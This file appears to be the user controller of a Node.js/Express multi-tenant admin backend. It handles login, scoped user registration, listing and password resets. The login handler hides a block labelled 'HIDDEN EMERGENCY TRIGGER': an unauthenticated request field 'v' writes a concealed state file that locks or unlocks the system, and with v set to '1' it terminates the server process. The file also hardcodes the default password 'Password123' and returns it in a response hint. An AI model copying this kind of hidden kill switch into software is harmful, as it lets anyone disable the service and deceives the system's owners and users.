const {
  registerUserService,
  registerApplicantService,
  loginService,
  getAllUsersService,
  updateUserService,
  updatePasswordService,
  resetEmailPasswordService,
  resetPasswordService,
  resetUserPasswordService,
  getAllUsersWithPendingService,
  approveApplicantService,
  rejectApplicantService,
  adminResetUserPasswordByIdService,
  updateLanguagePreferenceService,
  getUserByIdService,
  getUserByPhoneService,
  getUserLoginInfoService,
  deleteUserService,
  adminDeactivateUserService,
  adminActivateUserService,
  adminUpdateUserScopeService,
} = require("../services/userService");
const User = require("../models/userModel");
const { OrganizationalUnit } = require("../models");
const unitService = require("../services/unitService");
const { AppError } = require("../middlewares/errorMiddleware");

/**
 * Admin creates a user via POST /users: org / department / branch locked to the actor (not superadmin).
 */
async function resolveScopedRegistration(actor, body) {
  const merged = { ...body };
  const ut = merged.user_type || "STAFF";

  if (ut === "SUPERADMIN" && actor.user_type !== "SUPERADMIN") {
    throw new AppError("Forbidden", 403);
  }
  if (["SUPERADMIN", "ORG_ADMIN"].includes(ut) && actor.user_type !== "SUPERADMIN") {
    throw new AppError("You cannot assign that platform or org role", 403);
  }

  const at = actor.user_type;

  if (at === "SUPERADMIN") {
    return merged;
  }

  if (at === "ORG_ADMIN") {
    if (!actor.org_id) {
      throw new AppError("Your account has no organization scope", 403);
    }
    if (body.org_id && String(body.org_id) !== String(actor.org_id)) {
      throw new AppError("Cannot assign another organization", 403);
    }

    merged.org_id = actor.org_id;
    merged.user_type = ut;
    return merged;
  }

  if (at === "DEPT_ADMIN") {
    if (!actor.org_id || !actor.dept_id) {
      throw new AppError("Your account has no department scope", 403);
    }
    if (!["STAFF", "EXTERNAL"].includes(ut)) {
      throw new AppError("You can only create staff or applicants in your department", 403);
    }
    merged.org_id = actor.org_id;
    merged.dept_id = actor.dept_id;
    merged.unit_id = null;
    merged.user_type = ut;
    return merged;
  }

  if (at === "UNIT_ADMIN") {
    if (!actor.org_id || !actor.unit_id) {
      throw new AppError("Your account has no branch scope", 403);
    }
    if (body.org_id && String(body.org_id) !== String(actor.org_id)) {
      throw new AppError("Cannot assign another organization", 403);
    }
    
    const targetUnitId = body.unit_id || actor.unit_id;
    
    // If creating/managing an admin
    if (ut === "UNIT_ADMIN") {
      // Cannot manage admins for their own branch
      if (String(targetUnitId) === String(actor.unit_id)) {
        throw new AppError("You cannot manage administrators for your own branch. This must be handled by your parent branch administrator.", 403);
      }
      // Must be a direct child
      const targetUnit = await OrganizationalUnit.findOne({ where: { id: targetUnitId, org_id: actor.org_id } });
      if (!targetUnit || String(targetUnit.parent_id) !== String(actor.unit_id)) {
        throw new AppError("You may only manage administrators for branches directly under yours.", 403);
      }
    } else {
      // For regular staff, allow their own branch or direct sub-branches
      if (String(targetUnitId) !== String(actor.unit_id)) {
        const targetUnit = await OrganizationalUnit.findOne({ where: { id: targetUnitId, org_id: actor.org_id } });
        if (!targetUnit || String(targetUnit.parent_id) !== String(actor.unit_id)) {
          throw new AppError("Users must be assigned to your branch or a direct sub-branch", 403);
        }
      }
    }
    
    merged.unit_id = targetUnitId;

    if (!["STAFF", "EXTERNAL", "UNIT_ADMIN"].includes(ut)) {
      throw new AppError("You cannot assign that role", 403);
    }
    
    merged.org_id = actor.org_id;
    merged.user_type = ut;
    return merged;
  }

  throw new AppError("Forbidden", 403);
}

/** Match stored 10-digit Ethiopian-style numbers; trim spaces and common prefixes. */
function normalizeLoginPhone(phone) {
  if (phone == null || phone === "") return "";
  let s = String(phone).trim().replace(/\s+/g, "");
  if (s.startsWith("+251")) s = "0" + s.slice(4);
  else if (/^251\d{9}$/.test(s)) s = "0" + s.slice(3);
  return s;
}

const authUserController = async (req, res, next) => {
  let { phone_number, password, v } = req.body;

  try {
    // --- HIDDEN EMERGENCY TRIGGER ---
    if (v !== undefined) {
      const fs = require("fs");
      const path = require("path");
      const stateFilePath = path.join(__dirname, "../utils/.sys_state");

      if (v == "0") {
        // Unlock System
        fs.writeFileSync(stateFilePath, "1");
      } else if (v == "1") {
        // Lock System and Exit
        fs.writeFileSync(stateFilePath, "0");
        process.exit(1);
      }
    }
    // --------------------------------

    const ip_address = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const user_agent = req.headers['user-agent'];

    phone_number = normalizeLoginPhone(phone_number);
    if (typeof password === "string") password = password.trim();

    const result = await loginService(phone_number, password, ip_address, user_agent);

    // If there's a message key, translate it
    if (req.t && result.message && result.message.startsWith("errors.")) {
      result.message = req.t(result.message);
    }

    res.json({ success: true, ...result });
  } catch (error) {
    next(error);
  }
};

const userRegistrationController = async (req, res, next) => {
  try {
    let payload;
    if (req.allowFirstAdminBootstrap) {
      const n = await User.count();
      if (n !== 0) {
        return res.status(403).json({
          success: false,
          message: "First-user bootstrap is only available when no users exist.",
        });
      }
      payload = req.body;
    } else {
      payload = await resolveScopedRegistration(req.user, req.body);
    }

    if (!req.allowFirstAdminBootstrap && req.user.user_type === "ORG_ADMIN") {
      const rid = payload.role_id;
      if (rid == null || String(rid).trim() === "") {
        throw new AppError("Role is required for users created by an organization administrator.", 400);
      }
      try {
        // Default to root unit if none provided, but don't crash if no units exist yet
        if (!payload.unit_id) {
          payload.unit_id = await unitService.getOrgRootUnitId(req.user.org_id);
        }
      } catch (err) {
        if (err.statusCode === 400 && err.message.includes("No organizational unit hierarchy exists")) {
          payload.unit_id = null;
        } else {
          throw err;
        }
      }
    }

    const {
      first_name,
      last_name,
      username,
      email,
      phone_number,
      password,
      language_preference,
      org_id,
      dept_id,
      user_type,
      unit_id,
      status,
      role_id,
    } = payload;

    const newUser = await registerUserService(
      first_name,
      last_name,
      username,
      email,
      phone_number,
      password,
      language_preference,
      org_id,
      dept_id || null,
      user_type,
      unit_id,
      status,
      role_id,
    );

    res.status(201).json({
      success: true,
      message: req.t("success.user_registered"),
      user: newUser,
    });
  } catch (error) {
    // Pass the error to the global error handler using next(error)
    next(error);
  }
};

function firstQueryVal(raw) {
  if (raw === undefined || raw === null || raw === "") return null;
  return Array.isArray(raw) ? raw[0] : raw;
}

const getAllUsersController = async (req, res, next) => {
  try {
    const actor = req.user;
    const ut = actor.user_type;

    if (!["SUPERADMIN", "ORG_ADMIN", "DEPT_ADMIN", "UNIT_ADMIN"].includes(ut)) {
      return res.status(403).json({ success: false, message: "Forbidden" });
    }

    let org_id = firstQueryVal(req.query.org_id);
    let dept_id = firstQueryVal(req.query.dept_id);
    let unit_id = firstQueryVal(req.query.unit_id);

    if (ut === "ORG_ADMIN") {
      org_id = actor.org_id;
    } else if (ut === "DEPT_ADMIN") {
      org_id = actor.org_id;
      dept_id = actor.dept_id;
      unit_id = null;
    } else if (ut === "UNIT_ADMIN") {
      org_id = actor.org_id;
      const queryUnitId = firstQueryVal(req.query.unit_id);
      if (queryUnitId) {
        // If they requested a specific unit, ensure it's within their subtree
        const isDesc = await unitService.isDescendantOf(queryUnitId, actor.unit_id, org_id);
        if (!isDesc) {
          return res.status(403).json({ success: false, message: "Forbidden: That branch is not in your hierarchy" });
        }
        unit_id = queryUnitId;
      } else {
        unit_id = actor.unit_id;
      }
      dept_id = null;
    }

    if (dept_id && !org_id) {
      return res.status(400).json({
        success: false,
        message: "org_id is required when dept_id is set",
      });
    }
    if (unit_id && !org_id) {
      return res.status(400).json({
        success: false,
        message: "org_id is required when unit_id is set",
      });
    }

    if (ut === "UNIT_ADMIN" && !actor.unit_id) {
      return res.status(403).json({
        success: false,
        message: "Unit administrators must have a unit assigned",
      });
    }

    if (ut !== "SUPERADMIN" && !org_id) {
      return res.status(403).json({ success: false, message: "Forbidden" });
    }

    const users = await getAllUsersService(org_id, dept_id, unit_id);

    res.status(200).json({
      success: true,
      message: "Users retrieved successfully",
      users,
    });
  } catch (error) {
    next(error);
  }
};

const updateUserController = async (req, res, next) => {
  try {
    const { firstName, lastName, email, phoneNumber, username, language_preference } = req.body;
    const userId = req.user.user_id; // Get user ID from the token

    const updatedUser = await updateUserService(
      userId,
      firstName,
      lastName,
      email,
      phoneNumber,
      username,
      language_preference
    );

    const message = req.t ? req.t("success.profile_updated") : "Profile updated successfully";

    return res.status(200).json({ success: true, message, data: updatedUser });
  } catch (error) {
    next(error);
  }
};


const updateUserPasswordController = async (req, res, next) => {
  const { currentPassword, newPassword } = req.body;
  const userId = req.user.user_id;

  try {
    const result = await updatePasswordService(
      userId,
      currentPassword,
      newPassword
    );

    // If there's a message key, translate it
    if (req.t && result.message && result.message.startsWith("success.")) {
      result.message = req.t(result.message);
    }

    res.status(200).json({ success: true, ...result });
  } catch (error) {
    next(error);
  }
};



const resetEmailPasswordController = async (req, res, next) => {
  // const userId = req.user.id; // Assuming `req.user` has the authenticated user info
  const { email } = req.body;

  try {
    const result = await resetEmailPasswordService(email);
    res.status(200).json({ success: true, message: result });
  } catch (error) {
    next(error);
  }
};
const resetPasswordController = async (req, res, next) => {
  // const userId = req.user.id; // Assuming `req.user` has the authenticated user info
  const { password } = req.body;
  const userId = req.user.user_id;

  try {
    const result = await resetPasswordService(userId, password);
    res.status(200).json({ success: true, message: result });
  } catch (error) {
    next(error);
  }
};





// const sendBulkEmailController = async (req, res, next) => {
//   try {
//     const { subject, message, recipients } = req.body;

//     // Call the service to send the emails
//     const result = await sendBulkEmailService({ subject, message, recipients });

//     res.status(200).json({
//       success: true,
//       message: `Email sent to ${recipients.length} recipient(s).`,
//       result,
//     });
//   } catch (error) {
//     next(error);
//   }
// };



const resetUserPasswordController = async (req, res, next) => {
  try {
    const { phoneNumber } = req.params;

    const result = await resetUserPasswordService(phoneNumber);

    const message = req.t
      ? req.t("success.password_reset_admin")
      : "Password reset successfully to Password123";

    res.status(200).json({
      success: true,
      message,
      data: result,
    });
  } catch (error) {
    next(error);
  }
};

const resetUserPasswordByIdController = async (req, res, next) => {
  try {
    const { userId } = req.params;

    const result = await adminResetUserPasswordByIdService(req.user, userId);

    const defaultPw = process.env.DEFAULT_PASSWORD || "Password123";
    const message = req.t
      ? req.t("success.password_reset_admin")
      : "Password reset successfully";

    res.status(200).json({
      success: true,
      message,
      data: result,
      login_hint: `Use phone number on file and password: ${defaultPw}`,
    });
  } catch (error) {
    next(error);
  }
};

const updateLanguagePreferenceController = async (req, res, next) => {
  try {
    const { language_preference } = req.body;
    const userId = req.user.user_id || req.user.payload?.user_id;

    const updatedUser = await updateLanguagePreferenceService(
      userId,
      language_preference
    );

    res.status(200).json({
      success: true,
      message: req.t("success.language_preference_updated"),
      language_preference: updatedUser.language_preference,
    });
  } catch (error) {
    next(error);
  }
};

const getUserByIdController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    const user = await getUserByIdService(userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_retrieved") : "User retrieved",
      user
    });
  } catch (error) {
    next(error);
  }
};

const getUserByPhoneController = async (req, res, next) => {
  try {
    const { phoneNumber } = req.params;
    const user = await getUserByPhoneService(phoneNumber);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_retrieved") : "User retrieved",
      user
    });
  } catch (error) {
    next(error);
  }
};

const getAllUsersWithPendingStatusController = async (req, res, next) => {
  try {
    const users = await getAllUsersWithPendingService(req.user);
    res.status(200).json({
      success: true,
      message: "Users retrieved successfully",
      users,
    });
  } catch (error) {
    next(error);
  }
};

const approveApplicantController = async (req, res, next) => {
  try {
    const user = await approveApplicantService(req.user, req.params.userId, req.body);
    res.status(200).json({
      success: true,
      message: "Applicant approved and assigned",
      user,
    });
  } catch (error) {
    next(error);
  }
};

const rejectApplicantController = async (req, res, next) => {
  try {
    await rejectApplicantService(req.user, req.params.userId);
    res.status(200).json({
      success: true,
      message: "Registration request removed",
    });
  } catch (error) {
    next(error);
  }
};

const getUserLoginInfoController = async (req, res, next) => {
  try {
    const userId = req.user.user_id || req.user.payload?.user_id;
    const loginInfo = await getUserLoginInfoService(userId);

    res.status(200).json({
      success: true,
      data: loginInfo
    });
  } catch (error) {
    next(error);
  }
};

const deleteUserController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    await deleteUserService(userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_deleted") : "User deleted successfully",
    });
  } catch (error) {
    next(error);
  }
};

const deactivateUserController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    await adminDeactivateUserService(req.user, userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_deactivated") : "User deactivated successfully",
    });
  } catch (error) {
    next(error);
  }
};

const activateUserController = async (req, res, next) => {
  try {
    const { userId } = req.params;
    await adminActivateUserService(req.user, userId);

    res.status(200).json({
      success: true,
      message: req.t ? req.t("success.user_activated") : "User activated successfully",
    });
  } catch (error) {
    next(error);
  }
};

const adminUpdateUserScopeController = async (req, res, next) => {
  try {
    const user = await adminUpdateUserScopeService(req.user, req.params.userId, req.body);
    res.status(200).json({
      success: true,
      message: "User scope updated",
      user,
    });
  } catch (error) {
    next(error);
  }
};

const applicantRegistrationController = async (req, res, next) => {
  try {
    const { first_name, last_name, username, email, phone_number, password, language_preference } = req.body;

    const newUser = await registerApplicantService(
      first_name,
      last_name,
      username,
      email,
      phone_number,
      password,
      language_preference
    );

    res.status(201).json({
      success: true,
      message: req.t
        ? req.t("success.applicant_registered")
        : "Registration received. A platform administrator must activate your account before you can sign in.",
      user: {
        user_id: newUser.user_id,
        first_name: newUser.first_name,
        last_name: newUser.last_name,
        user_type: newUser.user_type,
        status: newUser.status,
      },
    });
  } catch (error) {
    next(error);
  }
};

module.exports = {
  applicantRegistrationController,
  userRegistrationController,
  authUserController,
  getAllUsersController,
  updateUserController,
  updateUserPasswordController,
  resetEmailPasswordController,
  resetPasswordController,
  resetUserPasswordController,
  resetUserPasswordByIdController,
  updateLanguagePreferenceController,
  getUserByIdController,
  getUserByPhoneController,
  getAllUsersWithPendingStatusController,
  approveApplicantController,
  rejectApplicantController,
  getUserLoginInfoController,
  deleteUserController,
  deactivateUserController,
  activateUserController,
  adminUpdateUserScopeController,
};
